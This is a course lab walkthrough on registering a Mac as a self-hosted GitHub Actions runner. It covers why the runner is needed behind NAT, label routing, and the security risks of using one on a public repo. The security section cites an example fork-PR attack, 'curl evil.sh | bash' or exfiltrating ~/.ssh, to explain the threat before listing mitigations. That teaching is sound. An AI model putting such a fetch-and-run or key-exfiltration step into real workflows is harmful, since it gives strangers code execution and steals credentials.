# Lab 5 — A self-hosted runner on your Mac

**Goal:** register your own Mac as a GitHub Actions runner, understand *why* the deploy in Lab 6 needs one, and confront the security reality that makes self-hosted runners a genuinely senior interview topic. By the end, a job labeled `self-hosted` runs on *your laptop* — the machine that can actually reach `vps-lab`.

## The mental map (read this first)

Everything so far ran on GitHub's disposable cloud VMs. Lab 6 needs to `ssh` into `vps-lab`, which listens on `localhost:9022` **on your Mac**. Can a GitHub-hosted runner reach it?

```
        GITHUB-HOSTED RUNNER (in a datacenter)          YOUR MAC (home/office network)
       ┌─────────────────────────────────┐            ┌──────────────────────────────┐
       │ wants to: ssh your-mac:9022      │            │ vps-lab container              │
       │                                  │  ─── ? ──▶ │  listening on localhost:9022   │
       │ but your Mac has:                │            │                                │
       │  • no public IP                  │   BLOCKED  │  behind home NAT + firewall,   │
       │  • no port forwarded             │            │  no inbound path from internet │
       └─────────────────────────────────┘            └──────────────────────────────┘

        SELF-HOSTED RUNNER (a process ON your Mac)
       ┌─────────────────────────────────┐            ┌──────────────────────────────┐
       │ runner process ── outbound ────▶ │  GitHub    │ same Mac: localhost:9022 is    │
       │  long-poll: "got work for me?"   │ ◀──────────│ RIGHT HERE — trivially reachable│
       └─────────────────────────────────┘            └──────────────────────────────┘
```

Two facts settle it:

**1. Home machines are unreachable from the internet by default.** Your Mac sits behind NAT (your router shares one public IP among all your devices) and a firewall. Nothing on the internet can open a connection *to* `localhost:9022` on your laptop — there's no route, no forwarded port, and you should *want* it that way. So a datacenter runner physically cannot SSH into `vps-lab`.

**2. Runners pull; GitHub never pushes.** This is the design fact from the section intro, and it's the escape hatch. A runner — hosted or self-hosted — makes an **outbound** HTTPS long-poll to GitHub: "any jobs for me?" GitHub answers on that connection it already has. GitHub never initiates a connection *inward*. So a runner process *on your Mac* needs zero open ports, zero public IP — it dials out, gets work, and runs it locally, where `localhost:9022` is just… local. That is the entire reason Lab 6 works.

The trade you're making: GitHub-hosted runners are **clean and disposable** (fresh VM per job, demolished after). A self-hosted runner is **your hardware, persistent, and dirty** — nobody wipes it between jobs, so state leaks run-to-run, and — the part interviewers push on — *code from the workflow runs on your actual machine*. On a **public repo** that's a loaded gun (step 5).

## Steps

### 1. Confirm the "why" with your own eyes (30 seconds)

You don't need to run anything — just reason it through against what you built. `vps-lab` publishes `9022:22` on your Mac (Section 1 Lab 5). Your Mac has no port-forward from your router to 9022. Therefore the only machine on earth that can `ssh -p 9022 mahadi@localhost` and reach `vps-lab` is **this Mac** (or something on your LAN). A CI deploy job must therefore run *here*. Hence: a self-hosted runner. Hold that reasoning — it's the answer to "why not just use a hosted runner for the deploy?" in Lab 6's interview drill.

### 2. Get the registration commands from the repo

GitHub generates a **short-lived registration token** and the exact commands, tailored to your OS/arch. Open:

```bash
gh browse --settings
```

Navigate: **Settings → Actions → Runners → New self-hosted runner → macOS / ARM64**. GitHub shows a block like the below (yours will have current URLs, a real token, and the current runner version — 2.335.1 or newer). **Do not paste the token anywhere in the repo** — it's a one-time secret shown only on that page, and it expires in ~1 hour.

Create a folder *outside* the repo (the runner is not course content, and you never want the runner's own files swept into a checkout):

```bash
mkdir -p ~/actions-runner && cd ~/actions-runner
# --- these three lines are COPIED FROM THE GITHUB PAGE (versions/token will differ) ---
curl -o actions-runner-osx-arm64-2.335.1.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.335.1/actions-runner-osx-arm64-2.335.1.tar.gz
tar xzf ./actions-runner-osx-arm64-2.335.1.tar.gz
```

Why a hand-download instead of `brew`: the runner binary is version-matched to GitHub's server and self-updates; GitHub wants you on *its* build. And the modern actions (checkout@v7, the docker actions) run on **Node 24**, which this runner version bundles — an older runner would fail those actions with a Node-version error. That's the one-line reason to take the current release GitHub offers, not an old cached one.

### 3. Register with labels

```bash
# token comes from the GitHub page — it is short-lived, do not commit it
./config.sh --url https://github.com/itsmahadi007/devops-course \
  --token <REGISTRATION_TOKEN_FROM_THE_PAGE> \
  --name mac-deploy \
  --labels macos,capstone-deploy \
  --unattended
```

Decoded:

- **`--url`** — the repo the runner attaches to. (Runners can be org-wide; repo-scoped is right for one project and safer.)
- **`--token`** — the short-lived registration token. It's exchanged *once* for a long-lived runner credential stored in `~/actions-runner/.credentials`; the registration token itself is then useless. Same shape as an OAuth code-for-token swap.
- **`--labels macos,capstone-deploy`** — **the routing tags**. A job says `runs-on: [self-hosted, macos, capstone-deploy]` and GitHub sends it *only* to a runner carrying all those labels. `self-hosted` is added automatically to every self-hosted runner. Labels are how you say "this job must run on the Mac, not in the cloud."
- **`--unattended`** — accept defaults, don't prompt (needed for scripting; fine here).

Expect: `√ Connected to GitHub`, then `√ Runner successfully added` and `√ Runner connection is good`.

### 4. Start it and route a job to it

Start the listener (foreground, so you can watch it — the S1 Lab 1 foreground rule, but for a listener process, not PID 1):

```bash
./run.sh
```

Expect `√ Connected to GitHub` then `Listening for Jobs`. That line **is** the outbound long-poll from the mental map — the connection is open, waiting. Leave this terminal running.

In `gh browse --settings → Actions → Runners`, the runner now shows a green **Idle** dot.

Now prove a job lands here. Add a throwaway job to `.github/workflows/hello.yml` (the scratchpad workflow from Lab 1 — *not* `ci.yml`, keep the real pipeline clean):

```yaml
  where-am-i:
    runs-on: [self-hosted, macos, capstone-deploy]
    steps:
      - name: This should run on MY Mac, not GitHub's cloud
        run: |
          echo "hostname : $(hostname)"
          echo "user     : $(whoami)"
          echo "uname    : $(uname -a)"
          echo "arch     : $(uname -m)"
```

```bash
git add .github/workflows/hello.yml
git commit -m "ci: prove the self-hosted runner picks up labeled jobs"
git push
gh workflow run hello        # or just watch the push trigger it
gh run watch
```

In the `run.sh` terminal you'll see the job get picked up and executed *live*. The step output proves it: `hostname` is your Mac's name (not `fv-az...` like a hosted runner), `arch` is `arm64`, `whoami` is *your* user. The job ran on your laptop.

#### If the job sits forever as "Queued"

No online runner matches *all* the labels in `runs-on:`. Check: is `run.sh` still running and showing `Listening for Jobs`? Do the labels in `runs-on:` exactly match what you registered (typo `capstone-deploy` vs `capstone_deploy` = no match)? A hosted-runner job would just start; a self-hosted job with no matching runner waits indefinitely — that silent wait is the #1 self-hosted gotcha.

#### If actions fail with a Node version error

`Node.js 20 is not supported` (or similar) means the runner binary is too old for Node-24 actions (checkout@v7 etc.). Stop it, re-download the current release from the runner page, reconfigure. This is why step 2 insisted on GitHub's current build.

### 5. The security reality (read this twice — it's the interview core)

Your `devops-course` repo is **public**. A self-hosted runner on a public repo is, by default, dangerous, and understanding exactly why is what separates a senior answer from a junior one:

- **A workflow runs arbitrary code from the workflow file — on your actual Mac.** Hosted runners make this safe by being disposable and isolated. Your Mac is neither. Whatever a job's steps say, run as your user, on your machine, with your network.
- **Fork pull requests are the attack.** Anyone on earth can fork a public repo and open a PR that edits the workflow to, say, `run: curl evil.sh | bash` or exfiltrate `~/.ssh`. If that PR's workflow ran on your self-hosted runner, a stranger just got code execution on your laptop. GitHub's own docs say plainly: **do not use self-hosted runners with public repositories.**
- **The mitigations** (the part that earns the interview point):
  1. **Require approval for fork-PR workflows.** Settings → Actions → General → *Fork pull request workflows from outside collaborators* → **Require approval for all outside collaborators** (public-repo default is safer now, but verify it). No fork PR runs a single line until you click approve.
  2. **Guard the job with `if:`** so the deploy path can't run from a fork: `if: github.event_name == 'push' && github.repository == 'itsmahadi007/devops-course'`. Fork PRs come from a different `github.repository` context / can't push to yours — the deploy simply never fires for them. Lab 6 uses exactly this guard.
  3. **Ephemeral runners** (`--ephemeral`): the runner accepts *one* job then deregisters, killing state-leak between jobs. Production self-hosted fleets are ephemeral + auto-scaled for this reason. (You'll run persistent here because it's a solo lab on a private-in-practice project, but *name* ephemeral as the real-world answer.)
  4. **Least privilege on the box**: a dedicated user, no secrets in the environment, the runner unable to touch anything it doesn't need. Your Lab 6 deploy will use a *dedicated deploy key*, never your personal SSH key, for exactly this blast-radius reason.

For this course: you control every commit, so persistent is acceptable — but you must *know* the above, because "you have a self-hosted runner on a public repo" is a red flag a good interviewer will poke, and the mitigations are the answer.

## Verify

- `gh api /repos/itsmahadi007/devops-course/actions/runners --jq '.runners[].status'` shows `online`.
- The `where-am-i` job output shows *your* hostname and `arm64`, proving it ran on your Mac, not GitHub's cloud.

Then answer aloud:

**1. Why can't a GitHub-hosted runner deploy to `vps-lab`, but a self-hosted one on your Mac can?**

<details><summary>Answer (read after attempting aloud)</summary>

`vps-lab` listens on `localhost:9022` on your Mac, which sits behind home NAT with no public IP and no forwarded port — nothing on the internet can open a connection inward to it, so a datacenter runner has no route. A self-hosted runner is a process *on the Mac itself*: it reaches `localhost:9022` trivially because it's already local. And it needs no inbound access because runners *pull* work over an outbound long-poll — GitHub never connects in. Outbound-only + runs locally = the only way to reach a NATed box.

</details>

**2. What do `--labels` do, and what happens to a job whose labels no runner matches?**

<details><summary>Answer (read after attempting aloud)</summary>

Labels route jobs. A job's `runs-on:` lists required labels; GitHub dispatches it only to a runner carrying *all* of them (`self-hosted` is auto-added). If no *online* runner matches every label, the job sits **Queued indefinitely** — no error, just a silent wait. That silent queue (vs a hosted job that would just start) is the classic self-hosted footgun; the fix is matching labels + a running listener.

</details>

**3. Why is a self-hosted runner on a *public* repo dangerous, and name two mitigations?**

<details><summary>Answer (read after attempting aloud)</summary>

A workflow runs arbitrary code on your real machine, and anyone can fork a public repo and open a PR that rewrites the workflow to run malicious code — if that ran on your self-hosted runner, a stranger gets code execution on your laptop. Mitigations: (a) require approval for fork-PR workflows from outside collaborators; (b) guard sensitive jobs with `if:` on `github.event_name`/`github.repository` so they never fire from forks; (c) ephemeral runners (`--ephemeral`, one job then deregister) to kill state leakage; (d) least-privilege box + dedicated deploy credentials. GitHub's own guidance: don't pair self-hosted runners with public repos without these.

</details>

**4. Runners are "outbound-only." Why does that make the whole model work behind NAT?**

<details><summary>Answer (read after attempting aloud)</summary>

Because the runner *initiates* the connection to GitHub (an outbound HTTPS long-poll) and GitHub replies on that already-open channel — GitHub never has to reach *in*. Outbound connections sail through NAT and firewalls (that's how all your normal web traffic works); inbound ones don't, without explicit port-forwarding. So a machine with zero open ports and no public IP — a laptop, a box in a locked-down network — can still be a fully functional CI worker. It's the same reason your browser can load websites without your router accepting inbound connections.

</details>

## Clean up

Leave the runner **registered** — Lab 6 needs it. But you don't want `run.sh` tying up a terminal forever, and you should remove the throwaway `where-am-i` job:

```bash
# remove the scratchpad job you added to hello.yml, then:
git add .github/workflows/hello.yml
git commit -m "ci: drop the runner-proof scratch job"
git push
```

For the runner process itself: stop `./run.sh` with `Ctrl-C` when you're not actively doing Lab 6. To run it as a background service that survives terminal close (handy for Lab 6), macOS uses `./svc.sh install && ./svc.sh start` (and `./svc.sh stop` / `uninstall` to reverse). If you ever want to fully remove the runner: `./config.sh remove --token <NEW_TOKEN_FROM_THE_PAGE>`.
